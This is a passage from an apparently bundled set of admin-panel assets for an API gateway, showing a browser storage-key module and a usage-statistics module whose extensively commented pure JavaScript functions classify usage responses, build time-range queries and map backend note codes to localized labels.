* **面板自己从不写它**（只读），运维/开发者手工设，所以它没有\"两处分叉\"的风险；\n * 收进来只是为了让「除 boot.js 外不许再出现 `agnes2api_` 字面量」那条判据能收干净。\n */\nexport const DEBUG_STORE = \"agnes2api_debug\";\n\n/**\n * **Playground 用的网关口令**（P3d Task 10，设计 §10.5）。\n *\n * ⚠️⚠️ **它与上面那把管理口令（`KEY_STORE`）是两把完全不同的钥匙，必须分开存。**\n * 管理口令走 `x-admin-key` 打 `/admin/api` 那棵树；网关口令是发给**每一个下游用户**\n * 的那把中转口令，走各协议惯用的鉴权头打对外那棵树。两者共用一个存储键的后果是\n * 「面板登录一次就等于把中转口令也换掉了」——而它们的泄漏面完全不同。\n * 隔离由 `tests/ui/gw-api.test.ts` 的\n * 「凭据头里没有 x-admin-key —— 管理口令绝不许走上对外那条路」与\n * `tests/ui/api-session.test.ts` 的「凭据头只有 x-admin-key —— 没有任何网关口令头」\n * 两格**各守一个方向**。\n *\n * ⚠️ **这把口令由用户手动粘贴，面板永远拿不到它的明文来源**（全局约束 11(b)、\n * 设计 §8.6「凭据只写不读」）：`GET /admin/api/config` 对 `gatewayToken` 只回\n * `{ configured, hint }`。**别想着做「一键填入我的口令」**——那需要在后端开一个\n * 明文回显口子，而那个口子一旦开了，整条「凭据只写不读」就没了。\n *\n * ⚠️⚠️ **登出时必须与上面那两个键一起清掉**（P3d Task 10 评审 M2，控制端裁定）。\n * 理由不是洁癖，是**别让面板严格变差**：`js/pure/session.mjs` 的文件头把\n * 「localStorage 里放的是原始 `ADMIN_TOKEN`，无过期、无登出、产品内无撤销路径」\n * 当成设 `SESSION_MAX_AGE_MS` 的**理由**——也就是说，那把口令的存在方式本身\n * 已经被这个项目判定成需要缓解的问题。\n * 而这一把**比它还弱**：没有年龄上限、后端也没有撤销路径。**再往同一块存储里加一把\n * 更弱的、还不跟着登出清掉的，是严格变差。**\n * 具体后果很朴素：共享 / 投屏的机器上，登出之后下一个人登录进来，\n * Playground 的口令框是**预填好的**。\n * ⚠️ **光清存储不够**：`js/sec-playground.js` 的模块变量在登出后仍然活着\n * （登出不 reload 页面，板块也不会重新 `init()`），所以那边在 `onShow()` 里\n * **每次都重新从存储读一遍**。两处缺一不可，由 `tests/ui/dom/playground-section.test.ts` 的\n * 「退出登录会一并清掉网关口令，重新登录之后那个框是空的 —— 共享机器上它本来是预填好的」\n * 那一格钉着。\n */\nexport const GW_KEY_STORE = \"agnes2api_gw_key\";\n", type: "text/javascript; charset=utf-8", etag: "\"5b29c10d7e776274\"" },
  "/admin/js/pure/usage.mjs": { body: "/**\n * 用量板块的取值判定。\n *\n * ⚠️ **这个板块的全部难点是三态**：「今天真的是 0 次请求」「Tier-2 没开」「读不出来」\n * 在面板上长得一模一样，而它们是三件事。设计文档 §10.6 与它的精度纪律那一条只说了\n * 「接口失败显示 `—`，绝不伪造 `0`」，那覆盖的是第三态；第二态（没开）它另给了一张\n * 说明卡。**本模块把三者变成一个显式的枚举，让板块文件不可能把它们揉在一起。**\n *\n * ── 本模块不写什么（P3d Task 5 评审 I17）──────────────────────────────────────\n * ⚠️ **不许再写一份 `fmtDash` / `fmtPercent`**。`admin-ui/js/pure/format.mjs` 的\n * `fmtDash` 与本模块第一版的 `fmtCell` **三条分支逐条相同、连注释理由都相同**\n * ——那是「改名抄」，而 `tests/ui/pure-boundary.test.ts` 的\n * 「盲区清单不是空的——如实登记按名字扫拦不住的那几类」那一格里，\n * `KNOWN_BLIND_SPOTS` 第一条逐字写着「改名抄：按名字扫抓不住」⇒ **零机器信号**。\n * 同理 `format.mjs` 的 `fmtPercent(num, den)` 已经带着「分母 `<= 0` 返回 —」\n * 这条不变量，重写一遍会让**同一个比率在概览页与用量页显示不同的字**。\n * ⇒ 数字格用 `fmtCount` / `fmtDash`，比率用 `fmtPercent`，\n * **本模块只负责「取哪个数、那个数算哪一种结局」，不负责「怎么写它」。**\n *\n * ── 这个模块与后端 `note` 的分工，一次说清 ───────────────────────────────────\n * `src/http/admin/handlers/usage.ts` 的 `USAGE_NOTES` 是一张**运行期**的 code 表，\n * 而 `note` 那一格是**摘要**：每一条 code 的判据全部来自同一份响应体里的其它字段\n *（`tier` / `range.clamped` / `days === null` / `shards` / `malformed`）。\n * ⇒ 本模块**两条路都走，而且刻意分开**：\n * · 顶部横幅照 `note` 走（后端已经定好优先级，前端再定一次就是第二份知识）；\n * · 「这份数字完不完整」照 `shards` / `malformed` 两个**字段**走（`malformedKind`）。\n * ⚠️ **两条路分开不是冗余，是必需的**：`GET /admin/api/usage/:date` **根本不发**\n * `all_malformed` / `partial_malformed` 这两条 code（它常态恒是 `no_request_detail`），\n * 单日下钻要判「这一天的分解是不是缺了几块」**只能靠字段**。\n * 同一件事在两条端点上有两套判据，本模块用**同一个函数**回答它们两个。\n */\n\n/**\n * 时间范围按钮组。**顺序就是渲染顺序**（设计 §10.6：`24h / 3d / 7d / 30d`）。\n *\n * ⚠️ **`30d` 刻意不是默认档**（P3d 计划待验证清单 U-H）：它一次要发\n * `30 × USAGE_SLOTS` 次子请求，而 Cloudflare 的两页官方文档在「一次调用能发\n * 多少次子请求」上互相对不上（Workers limits 页免费档 50，KV limits 页 1,000，\n * 而前者没有定义 KV 算哪一行）。**在 P3e 的真机验收把它了结之前，\n * 这里、板块文案、以及任何一处注释都不许写成「那些子请求是安全的」。**\n * 能写下来的只有一句：把它做成默认档等于让每一个打开面板的人都先付一次那个赌注。\n */\nexport const RANGES = [\"24h\", \"3d\", \"7d\", \"30d\"];\n\n/** 默认档位。见 `RANGES` 上方那段——**不是 `30d`**。 */\nexport const DEFAULT_RANGE = \"24h\";\n\n/** UTC 一天的毫秒数。与 `src/core/admin/usage-stats.ts` 的 `USAGE_DAY_MS` 同一个数。 */\nconst DAY_MS = 86400000;\n\n/** 有限数字，否则 `null`。**`NaN` / `Infinity` / 非数字一律当「没有值」**。 */\nfunction finite(v) {\n  return typeof v === \"number\" && Number.isFinite(v) ? v : null;\n}\n\n/** 普通对象，否则 `null`。数组不算（`days` 的元素才是对象，`days` 自己是数组）。 */\nfunction obj(v) {\n  return typeof v === \"object\" && v !== null && !Array.isArray(v) ? v : null;\n}\n\n/**\n * 档位 → 按钮上的文案 key。\n *\n * ⚠️ **一律字面量，禁止把档位名拼进 key**（写成 `t(某个前缀 + range)` 那种；\n * P3d 全局约束 12）：\n * `scripts/check-i18n.mjs` 的第 ④ 条把动态拼出来的 key 一律看成「未被引用」，\n * 而那一条**只报警告、从不 exit 1**。\n * ⚠️⚠️ **别把这句读成「所以第 6 道门禁在守它」**：那道门禁只认两种形态\n * ——把 key 当**双引号**字符串字面量直接写进 `t(…)` 调用里，或者写进 HTML 的\n * `data-i18n` 系列属性里；**本仓主流的 `elI18n(tag, key, attrs)` 它一个都看不见**\n *（本板块新增的那批 key 里绝大多数正是这种写法）。\n *\n * ⚠️ **但「门禁看不见」不等于「没人守」——这两句差得很远，别再合成一句。**\n * 守它的是 `tests/unit/i18n-dict.test.ts` 的\n * 「板块里当参数传的 i18n key（elI18n / labelKey 这类）同样必须在字典里」那一格：\n * 它按**命名空间前缀**扫 `admin-ui/js` 下的 `.js`/`.mjs`，要求形如\n * `\"<已知命名空间>.<键名>\"` 的字面量都在字典里，并带着**三条**反向自检\n *（扫描不许是空集 / `NAMESPACES` 不许漏掉真的在用的命名空间 / 表里不许有死条目）。\n * ⚠️ **实测记下装置**（P3d Task 5 变异 M-N）：把\n * `admin-ui/js/sec-usage.js` 里那句给 `elI18n` 传 `\"usage.title\"` 的调用改成\n * `\"usage.titel\"` ⇒ `node scripts/check-i18n.mjs` **exit=0**（第 6 道门禁确实瞎），\n * 而那一格**当场变红**（报的是「板块引用了字典里没有的 key」，列出那个拼错的串）。\n * ⭐ 记一条形状：**「某道门禁看不见它」是一句关于那道门禁的话，\n * 不是一句关于「有没有护栏」的话**；把前者写成后者，下一个人会以为这里可以随便写。\n *\n * ⚠️⚠️ **上一版这里写过「新板块想跳过它是做不到的」——那句全称命题实测为假，\n * 订正如下（P3d Task 5 定向复评 I2）。** 只要把 key 两侧的引号从双引号换成**单引号**\n *（把那一句里 `usage.titel` 外面的一对双引号原样换成一对单引号），\n * **三道 i18n 门禁一起哑**：\n * `check-i18n.mjs` exit=0、上面那一格 8 passed、面板主标题在五种语言下显示裸串。\n * 成因是 `scripts/check-i18n.mjs` 的规则 ① 与 `tests/unit/i18n-dict.test.ts`\n * 的两处扫描正则**都把双引号硬编码在判据里**——而 `check-i18n.mjs` 自己在规则 ⑧\n * 上方逐字记过同一个坑（「仓里没有引号风格门禁，单引号重放让它 exit 0」），\n * **补的只有规则 ⑧，规则 ① 与那份测试都没跟上**。\n * ⭐ 它与 `tests/ui/no-hardcoded-endpoints.test.ts` 的\n * 「正则认得三种引号下的 /v1 与 /v1beta，且不误伤上游路径 —— 否则上面那个空数组什么都没证明」\n * 那一格防的是**同一个盲区的镜像**（那次是判据只认单引号、漏掉双引号；\n * 那一格现在三种引号都扫）。\n * ⇒ **控制端裁定归 P3e**（它牵动三处正则，且与那条是同族，值得一并治），\n * 这里只负责如实写出来：**本板块的 key 一律双引号**（实测 60 处双引号、0 处单引号）。\n *\n * ⚠️⚠️ **「换成单引号就没有任何东西在守」——这句全称否定实测为假，订正如下**\n *（P3d Task 5 收口复评 F2；**这已经是同一段文字第三次栽在全称句上**）：\n * 三道 i18n 门禁确实一起哑，**但那不等于没人守**。还剩一层网：\n * **凡是这个 key 的渲染文本被某一格 DOM 用例正面断言过的，那一格会红。**\n * 实测两个方向都跑过：\n * · `usage.detail.incomplete` —— 把它连同引号一起改成一个拼错的串\n *   ⇒ `check-i18n` **exit=0**，而 `tests/ui/dom/usage-section.test.ts` 的\n *   「下钻的「不完整」真的渲染得出来，且是单日口径 …」与\n *   「下钻的「缺了几块」只能靠 shards / malformed 字段 …」**两格红**\n *   （它们断言的是那句中文本身，不是 key）；\n * · `usage.title` —— 同样手法 ⇒ **66 全绿、完整逃逸**（没有任何一格断言过那句标题）。\n * ⇒ **准确的说法是**：单引号写法下，i18n 门禁全哑；**只有渲染文本被 DOM 用例\n * 正面断言过的那些 key 还剩一层网，其余的实测无人守**。\n * ⭐ 与上面 `:79` 那条形状是同一条，而我这一次是从相反方向踩的：\n * 上一次把「门禁看不见」写成了「有护栏」，这一次把「门禁看不见」写成了\n * 「没有任何东西在守」。**两次都是把一句关于某道门禁的话，写成了一句关于全局的话。**\n *\n * 它仍然守不住的：动态拼出来的 key、单引号写法（见上）、\n * 以及命名空间本身写成字典里没有的前缀。那几类靠评审 + 人工冒烟。\n * ⚠️ **「只写在 `.html` 里而拼错的 `data-i18n`」不在这张清单里——上一版把它列进来了，\n * 而那是假的**：实测把 `admin-ui/index.html` 里那个导航按钮的 `data-i18n`\n * 属性值（`nav` 命名空间下的 `usage`）改成一个拼错的串\n * ⇒ `check-i18n` 报「引用了字典里没有的 key」并 **exit=1**。\n * ⚠️⚠️ **这一段刻意不把那个属性写成完整形态**（收口复评 F3）：\n * `scripts/check-i18n.mjs` 的规则 ① **不去注释**（它直接对整份文件跑正则，\n * 而 `tests/unit/i18n-dict.test.ts` 那一格是先 stripComments 再扫的），\n * ⇒ 注释里写一个完整的 `data-i18n` 属性会被它当成**真引用**。两条后果：\n * ① 真把 `index.html` 里那句删掉 / 改名时，规则 ④ 的「未被引用」告警\n *    **会被这条注释顶掉**；\n * ② **反向雷**——谁把示例补全成一个**拼错的** key，当场把 CI 打红\n *    （实测：把注释里那串改成一个不存在的 key ⇒ `check-i18n` **exit=1**）。\n * ⚠️ **如实登记一条我差点写错的**：它**不会**让横幅上的「N 处引用」变大——\n * 那个数是 `used.size`（Set），而 `nav.usage` 本来就被 `index.html` 真引用着，\n * 两处折叠成同一格。实测删掉注释里那串前后**都是 110 处**。\n * 「多一处幻影」这句话只在**那个 key 别处没被引用**时才成立。\n * 上面引的那份测试在 `NAMESPACES` 空表说明里逐字写着「那一半由\n * `scripts/check-i18n.mjs` 的第 ① 条覆盖（它连 `.html` 一起走）」\n * ——**上一版引了那份文件，却把它说反了。**\n *\n * 表外返回 `null`，与 `admin-ui/js/pure/registrar.mjs` 的 `failureReasonKey`\n * 同一条纪律：**调用方拿到 `null` 时把原值照实显示出来，绝不冒充任何一档已知档位。**\n */\nexport function rangeLabelKey(range) {\n  switch (range) {\n    case \"24h\": return \"usage.range.24h\";\n    case \"3d\": return \"usage.range.3d\";\n    case \"7d\": return \"usage.range.7d\";\n    case \"30d\": return \"usage.range.30d\";\n    default: return null;\n  }\n}\n\n/**\n * 时间范围按钮 → 查询参数。**只发 `from` / `to` 两个 epoch 毫秒**，\n * 参数契约由 `src/http/admin/handlers/usage.ts` 的 `parseRange` 钉死\n *（`days` 不是参数，服务端一个字都不认）。\n *\n * ── `from = to − (N − 1) × 86400000`，差一天的后果不是「多一天数据」 ──────────\n * 服务端按**整 UTC 天**取，而「N 天」含今天。发成 `now − N × 86400000` 的话\n * `askedFromDay = 今天 − N`，而保留期起点是 `今天 − (USAGE_DAY_RETAIN − 1)`\n * ⇒ **`30d` 那一档每一次都 `clamped: true`**，面板于是每一次都说\n * 「这段时间早于保留期，只显示了能拿到的部分」——**说到运维不再看它**。\n *\n * ⚠️⚠️ **P3d Task 5 简报 Step 1 给的那段示例代码写的正是 `nowMs - days * 86400000`，\n * 它与本仓后端的契约相反，这里刻意不照抄。** 正反两个方向都由\n * `tests/contract/admin-usage.test.ts` 的\n * 「四个档位按 from = to − (N−1) 天 发：clamped 全是 false；按 N 天发：30d 那一档恒为 true」\n * 那一格钉着（**两边都断言**，只写正向的话「clamped 恒为 false」的实现也全绿）。\n *\n * **区间取整由服务端做**（滚动 30 天会横跨 31 个 UTC 日），前端只发滚动时刻，\n * 并**渲染服务端回读的 `range`**，不自己算显示区间。\n *\n * `nowMs` 不是有限数时返回 `null`：拿 `NaN` 拼查询串会得到 `from=NaN`，\n * 而那是一条 400（`msParam` 的 `Number.isSafeInteger` 判据），\n * 让面板显示「参数发错了」比让它显示「这段时间没有数据」诚实得多。\n */\nexport function rangeToQuery(range, nowMs) {\n  const days = { \"24h\": 1, \"3d\": 3, \"7d\": 7, \"30d\": 30 }[range];\n  if (days === undefined) return null;\n  const to = finite(nowMs);\n  if (to === null) return null;\n  return { from: to - (days - 1) * DAY_MS, to };\n}\n\n/**\n * 分片畸形到什么程度。**判据是 `shards` 与 `malformed` 两个字段，不是 `note`。**\n *\n * | 返回值 | 判据 | 意味着 |\n * |---|---|---|\n * | `\"unknown\"` | 两个字段里有一个不是有限数字（含整块 `null`） | 分片计数本身读不出来 |\n * | `\"none\"` | `malformed === 0` | 读到的分片全是好的 |\n * | `\"all\"` | `malformed > 0 && shards === 0` | **读到了分片，但每一个都坏** |\n * | `\"partial\"` | `malformed > 0 && shards > 0` | **一部分坏 ⇒ 这份数字是不完整的** |\n *\n * ⚠️ **这是本模块唯一回答「分片坏没坏」的地方，两条端点共用它**（见文件头）：\n * 汇总端点在 `note` 里也说了同一件事，单日下钻端点**只说字段**。\n * 让两条端点各写一份判据的后果是它们迟早对同一份响应给出不同的结论。\n */\nexport function malformedKind(resp) {\n  const r = obj(resp);\n  if (r === null) return \"unknown\";\n  const shards = finite(r.shards);\n  const malformed = finite(r.malformed);\n  if (shards === null || malformed === null) return \"unknown\";\n  if (malformed <= 0) return \"none\";\n  return shards === 0 ? \"all\" : \"partial\";\n}\n\n/**\n * 整块用量的状态。**四态互不重叠。**\n *\n * @returns {\"off\"|\"unavailable\"|\"empty\"|\"data\"}\n *\n * ⚠️ **判据取的是顶层 `total.requests`，不是 `days` 里有没有非零的一天**，\n * 而这一条不是随手选的：`src/http/admin/handlers/usage.ts` 的 `total` 字段上方\n * 逐字写着「**别把它写成恒等于 Σ`days`**」——一个自报 `day` 与它所在的键对不上的\n * 分片会进 `total` 而进不了任何一格 `days`，方向是「`total` 只多不少」。\n * ⇒ 照 `days` 判会得到「横幅说『这段时间没有请求』，而总请求数那张卡写着 42」。\n * **状态判据必须与卡片除以的那个数同源。**\n *\n * ⚠️⚠️ **`all_malformed` 归 `unavailable`，这一条是本模块自己的裁定，写下理由**：\n * 那一档下 `days` 每天一格全是 0 桶、`total` 也是 0 桶，但**那些 0 不是知识**\n * ——读到的每一个分片都是坏的，我们对这段时间的用量**一无所知**。\n * 把它渲染成 `0` 正是全局约束 9 禁的「伪造 0」，只是这一次伪造的不是「接口失败」\n * 那一档，而是「读到的全是垃圾」那一档。归 `unavailable` ⇒ 六张卡全是 EM DASH，\n * 顶部横幅照 `note` 说 `all_malformed`（「去查存储」），两件事都说准了。\n * ⇒ **`partial_malformed` 不归这里**：那一档确实读到了好分片，数字是真的，\n * 只是不全 —— 由 `malformedKind` 交给板块打「不完整」标记（见 `summaryCards`）。\n *\n * ⚠️⚠️⚠️ **这个结论必须往下传到每一张表，否则同一份 `0` 只是挪到了下一屏。**\n * P3d Task 5 评审 C1 实测：上面那句 `all_malformed` 早退**只作用于六张卡**，\n * 而 `days` 数组（每天一格全 0 桶）被原样交给日汇总表 ⇒\n * `no_shards`（③）与 `all_malformed`（⑦）的日表行**逐字节相同**\n *（`2026-08-21|0|0|0|0 / 0|0|–|下钻`）——顶部六张卡刚说完「我们不知道」，\n * 紧挨着的表就把同一段区间写成「请求 0 次」。\n * ⭐ **根因是「上一处修复」本身**：为了让卡片别写 `0` 而加的早退，\n * 把那份 `0` 留给了下一个消费者。⇒ 每一个渲染数字的地方都要走 `rowState()`，\n * **不许自己按行判**（本文件 `rowState` 上方有它的全文）。\n */\nexport function usageState(resp) {\n  const r = obj(resp);\n  if (r === null) return \"unavailable\";\n  if (r.tier === \"off\") return \"off\";\n  if (!Array.isArray(r.days)) return \"unavailable\";\n  if (malformedKind(r) === \"all\") return \"unavailable\";\n  const total = obj(r.total);\n  const requests = total === null ? null : finite(total.requests);\n  if (requests === null) return \"unavailable\";\n  return requests > 0 ? \"data\" : \"empty\";\n}\n\n/**\n * 单日下钻那一份的整块状态。**判据与 `usageState` 同源，只是字段不同。**\n *\n * @returns {\"off\"|\"unavailable\"|\"data\"}\n *\n * ⚠️ **没有 `empty` 这一档**：这条端点的三个 map 只含**有过流量**的那些键\n *（`src/http/admin/handlers/usage.ts` 的 `usageDateHandler` 上方：「缺席的小时\n * 不是『读不出来』」），所以「表是空的」在读成功时就是「这一天没有记录」，\n * 不需要再分一档。\n *\n * ⚠️⚠️ **它存在的理由与 `usageState` 的 `all_malformed` 早退完全相同，\n * 而且是同一次评审（C1）点名的「第三屏」**：`all_malformed` 时\n * `mergeDayShards` 什么都合不出来 ⇒ 三个 map 都是空的 ⇒ 三张分解表都会说\n * 「这一天没有可以分解的记录」——**而事实是那一天的分片全坏了，我们什么都不知道**。\n * 那句话与 ③/⑦ 在日表上撞车是同一个形状，只是换了一屏。\n * `date_out_of_retention` 同样归 `unavailable`：那天的记录已经不在了，\n * **不是那天没有请求**，具体是哪一种由 `note` 那条横幅说。\n */\nexport function detailState(resp) {\n  const r = obj(resp);\n  if (r === null) return \"unavailable\";\n  if (r.tier === \"off\") return \"off\";\n  // `hours` 整块是 `null` = 读不出来（`read_failed` / 落在保留期外 / 时钟坏了）。\n  // 空对象 `{}` **不算**——那是「读成功了，这一天没有流量」。\n  if (obj(r.hours) === null) return \"unavailable\";\n  if (malformedKind(r) === \"all\") return \"unavailable\";\n  return \"data\";\n}\n\n/**\n * 表格里一行该按哪一种状态渲染。\n *\n * ⚠️⚠️ **整块读不出来时每一行都读不出来 —— 这就是 C1 的根因那一句话的落点。**\n * 上一版这两张表各自写了 `row.total === null ? \"unavailable\" : \"data\"`\n *（**完全不看整块状态**），于是 `usageState` 判出来的 `unavailable`\n * 一步都没往下传。判据收进这一个函数之后，再加第三张表时它是**必经之路**。\n *\n * 第二个参数是这一行自己的桶：整块读成功了、而这一行的桶读不回来（形状不对），\n * 那也是「这一行我们不知道」，**不是这一行是 0**。\n */\nexport function rowState(state, bucket) {\n  if (state === \"off\" || state === \"unavailable\") return \"unavailable\";\n  return obj(bucket) === null ? \"unavailable\" : \"data\";\n}\n\n/**\n * 这一块**读成功了没有**。两张表拿它决定「空」的时候该说哪一句。\n *\n * ⚠️⚠️ **判据必须是白名单（「只有确知读成功了才说『没有』」），不是黑名单**\n *（P3d Task 5 定向复评 N6）：上一版日表写的是\n * `state === \"unavailable\" ? 不可用 : 空`——那是黑名单，方向是反的。\n * `usageState` 哪天多一档（比如将来加一个 `\"stale\"`），那一档会**默认落到\n * 「这段区间里没有可以列出的日子」**，也就是**默认说假话**；\n * 而分解表那一边当时写的是 `state === \"data\" ? 空 : 不可用`——保守。\n * **同一件事两张表两个方向**，本身就是下一次分叉的入口。\n * ⇒ 收进这一个函数，两张表都过它，默认往「我们不知道」那边倒。\n *\n * ⭐ 记一条形状：**「排除掉已知的坏情况」与「只放行已知的好情况」\n * 在今天的取值集合上等价，在明天多一档时相反**——而护栏要挡的正是明天那一档。\n */\nexport function readSucceeded(state) {\n  return state === \"data\" || state === \"empty\";\n}\n\n/**\n * 平均延迟。`latencyCount === 0` 时返回 `null` —— **没有样本不等于零延迟**。\n * **调用方拿 `cellKind` 去决定它渲染成哪一种破折号**，本模块不决定它长什么样\n *（见文件头的 I17）。\n */\nexport function avgLatency(bucket) {\n  const b = obj(bucket);\n  if (b === null) return null;\n  const c = finite(b.latencyCount);\n  const sum = finite(b.latencySum);\n  if (c === null || sum === null || c <= 0) return null;\n  return Math.round(sum / c);\n}\n\n/**\n * 一个数字格的三种结局。**这是「三态不许长得一样」在单元格这一层的落点。**\n *\n * | 返回值 | 什么时候 | 板块渲染成 |\n * |---|---|---|\n * | `\"value\"` | 整块读成功了，而且这一格是个有限数字（**含 0**） | 那个数字 |\n * | `\"none\"` | 整块读成功了，但这一格没有可用的样本 / 分母 | **`–` EN DASH（U+2013）** |\n * | `\"unknown\"` | 整块就没读出来（`off` / `unavailable`） | **`—` EM DASH（U+2014）** |\n *\n * ⚠️⚠️ **计数类在 `empty` 态显示 `0` 是对的，别「修」成破折号**：这一次读成功了，\n * 我们**确实知道**答案是零。把真零画成破折号是**反向的撒谎**，与「接口失败伪造 0」\n * 同样严重、方向相反。`empty` 态下 `total.requests` 就是数字 `0` ⇒ 这里返回\n * `\"value\"` ⇒ 卡上是 `0`。**而同一个 `empty` 态下比率与平均延迟走的是 `\"none\"`**\n *（分母是 0、样本是 0），两类卡因此在同一个状态下长得不一样 —— 那正是要的。\n *\n * ⚠️ **两个破折号必须视觉可区分，而判据在这里、不在板块文件里**：让板块自己\n * 目测「这一格该画哪一根」就等于把三态判定复制回了 DOM 拼装代码。\n */\nexport function cellKind(state, value) {\n  if (state === \"off\" || state === \"unavailable\") return \"unknown\";\n  return finite(value) === null ? \"none\" : \"value\";\n}\n\n/**\n * 比率格的结局。**分母 `<= 0` 就是「没有比率可算」，不是「比率是 0%」。**\n *\n * 与 `format.mjs` 的 `fmtPercent` 那条「分母 `<= 0` 返回 —」是同一条不变量的\n * 两个面：`fmtPercent` 回答「写成什么字」，这里回答「这一格属于三态里的哪一态」。\n * ⚠️ **少了这一层，`empty` 与 `unavailable` 在比率卡上会长得一模一样**：\n * `fmtPercent(0, 0)` 与 `fmtPercent(null, null)` **都返回 EM DASH**，\n * 而前者的意思是「这段时间没有请求」、后者是「读取失败」。\n */\nexport function ratioKind(state, den) {\n  const d = finite(den);\n  return cellKind(state, d === null || d <= 0 ? null : d);\n}\n\n/**\n * 一个桶里那六个数。**六张汇总卡、日汇总表、三张分解表共用它。**\n *\n * ⚠️⚠️ **它是从 `summaryCards` 里拆出来的，而拆它的理由是一个真缺陷**\n *（P3d Task 5 评审 C1 / 全局约束 10）：两张表原来这样取数——\n * `summaryCards({ total: row.total, shards: 0, malformed: 0 })`\n * ——**那两个 `0` 是前端凭空写死的诚实信号**。响应里 `shards`/`malformed`\n * 是什么与这一行的桶无关，捏一对出来只是为了骗过 `summaryCards` 的入参形状。\n * ⇒ 把「取哪六个数」与「这份数据完不完整」拆成两件事：**前者对着一个桶问，\n * 后者只能对着整份响应问**（`malformedKind`），谁都不必再捏一个假响应。\n */\nexport function bucketCells(bucket) {\n  const b = obj(bucket);\n  const pick = (name) => (b === null ? null : finite(b[name]));\n  return {\n    requests: pick(\"requests\"),\n    success: pick(\"success\"),\n    errors: pick(\"errors\"),\n    tokensIn: pick(\"tokensIn\"),\n    tokensOut: pick(\"tokensOut\"),\n    streamingRequests: pick(\"streamingRequests\"),\n    latencyMs: avgLatency(b),\n  };\n}\n\n/**\n * 六张汇总卡要的那几个数（设计 §10.6：\n * `总请求数 / 成功率 / 平均延迟 / 错误率 / Token（仅非流式）/ 流式请求数`）。\n *\n * **全部取自顶层 `total`**，不自己把 `days` 加一遍——理由与 `usageState` 上方\n * 那段同源（`total` 只多不少，自己加会**少报**一段真实发生过的流量，\n * 而少报比多报更难被发现）。\n *\n * `complete` **由 `malformedKind` 驱动，不是常量**（全局约束 10：诚实标记由\n * 后端字段驱动）：`\"partial\"` ⇒ `false` ⇒ 板块必须把这几个数标成不完整的。\n * ⚠️ **`partial_malformed` 那一档的数字是真的，只是不全** —— 渲染成完整的\n * 就是伪造「这份数据是全的」这个印象，而全局约束 9 禁的伪造**不只是伪造 `0`**。\n *\n * 整块读不出来时六格全是 `null`，`complete` 是 `true`（**没有数据就谈不上残缺**\n * ——那一档由 `usageState` 的 `unavailable` 整个接管，六格已经是 EM DASH，\n * 再叠一个「不完整」标记只会让运维以为「有一部分是好的」）。\n */\nexport function summaryCards(resp) {\n  const r = obj(resp);\n  const total = r === null ? null : obj(r.total);\n  const kind = malformedKind(r);\n  return {\n    ...bucketCells(total),\n    complete: total === null ? true : kind !== \"partial\",\n    malformed: r === null ? null : finite(r.malformed),\n  };\n}\n\n/**\n * 后端 `note` → i18n key。\n *\n * ⚠️⚠️ **表外返回 `null`，而这一条不是形式主义。**\n * `tests/contract/admin-usage.test.ts` 的\n * 「八种状态两两不同 —— 面板不用猜，也不该猜（但这一格证明不了没有第九种）」\n * 那一格的名字自己就把边界说清了：它证明的是**已列出的那八种互不相同**，\n * **不是「没有第九种」**。`src/http/admin/handlers/usage.ts` 的 `USAGE_NOTES`\n * 今天有九条 code，而后端加第十条时这里不会有任何东西红。\n * ⇒ **前端不许假设 `note` 只可能是表内的值**：拿到表外的 code 时调用方\n * 把它**原样显示出来**（运维至少能拿着那个串去 grep 后端），\n * 绝不退回一句「加载失败」——那会把一条本来说得清的信号抹成一句废话。\n * 这条纪律与 `admin-ui/js/pure/registrar.mjs` 的 `failureReasonKey`\n * / `refuseReasonKey` 逐字相同。\n */\nexport function usageNoteKey(note) {\n  switch (note) {\n    case \"tier2_off\": return \"usage.note.tier2Off\";\n    case \"clock_unavailable\": return \"usage.note.clockUnavailable\";\n    case \"read_failed\": return \"usage.note.readFailed\";\n    case \"range_clamped\": return \"usage.note.rangeClamped\";\n    case \"date_out_of_retention\": return \"usage.note.dateOutOfRetention\";\n    case \"no_shards\": return \"usage.note.noShards\";\n    case \"all_malformed\": return \"usage.note.allMalformed\";\n    case \"partial_malformed\": return \"usage.note.partialMalformed\";\n    case \"no_request_detail\": return \"usage.note.noRequestDetail\";\n    default: return null;\n  }\n}\n\n/**\n * 这条 `note` 该用哪一档横幅。`null` = 不出横幅（`note` 本来就没有）。\n *\n * @returns {\"error\"|\"warn\"|\"info\"|null}\n *\n * ⚠️ **分档判据是「谁需要人去查」，与后端 `note` 的优先级同源**\n *（`src/http/admin/handlers/usage.ts` 的 `usageHandler` 上方那张表底下逐字写着\n * 「畸形要人去查存储，被夹只是一句提示」）：\n * · `error` —— `read_failed` / `clock_unavailable` / 畸形那两条：**要人去查**；\n * · `warn` —— `range_clamped`：只是一句提示；\n * · `info` —— `tier2_off` / `no_shards` / `date_out_of_retention` /\n *   `no_request_detail`：都是「本来就该是这样」的常态说明。\n *\n * ⚠️ **表外的 code 归 `warn`，刻意不归 `info` 也不归 `error`**：\n * 归 `info` 等于把一条读不懂的信号当成常态（那正是 `note: null` 曾经干过的事，\n * 见 `USAGE_NOTES` 的 `partial_malformed` 上方那段），归 `error` 又会在后端\n * 加一条纯提示型 code 的那天把面板变成一片红。\n */\nexport function noteSeverity(note) {\n  if (note === null || note === undefined) return null;\n  switch (note) {\n    case \"read_failed\":\n    case \"clock_unavailable\":\n    case \"all_malformed\":\n    case \"partial_malformed\":\n      return \"error\";\n    case \"range_clamped\":\n      return \"warn\";\n    case \"tier2_off\":\n    case \"no_shards\":\n    case \"date_out_of_retention\":\n    case \"no_request_detail\":\n      return \"info\";\n    default:\n      return \"warn\";\n  }\n}\n\n/**\n * 日汇总表的行。**每天一格，缺数据的那天是 0 桶** —— 后端就是这么发的\n *（`src/http/admin/handlers/usage.ts` 的 `days` 字段上方：「恒是『每天一格』，\n * 不是『只列有数据的那几天』」），前端**不许自己补缺口**，那等于把「哪些天该出现」\n * 这条知识复制一份到面板。\n *\n * 整块读不出来（`days` 不是数组）时返回空数组：表本身不渲染，那一档由顶部横幅承担。\n * 形状不对的单行**跳过而不是补零**：一行读不懂就是读不懂，补一行 0 是伪造一天的记录。\n */\nexport function dayRows(resp) {\n  const r = obj(resp);\n  if (r === null || !Array.isArray(r.days)) return [];\n  const out = [];\n  for (const d of r.days) {\n    const row = obj(d);\n    if (row === null || typeof row.date !== \"string\" || row.date === \"\") continue;\n    out.push({ date: row.date, total: obj(row.total) });\n  }\n  return out;\n}\n\n/**\n * 单日下钻那三张表（`hours` / `byModel` / `byProtocol`）的行。\n *\n * ⚠️⚠️ **入参是后端交出来的**无原型对象**，键来自客户端填的模型名**\n *（`__proto__` / `toString` / `constructor` 都造得出来，\n * `src/http/admin/handlers/usage.ts` 的 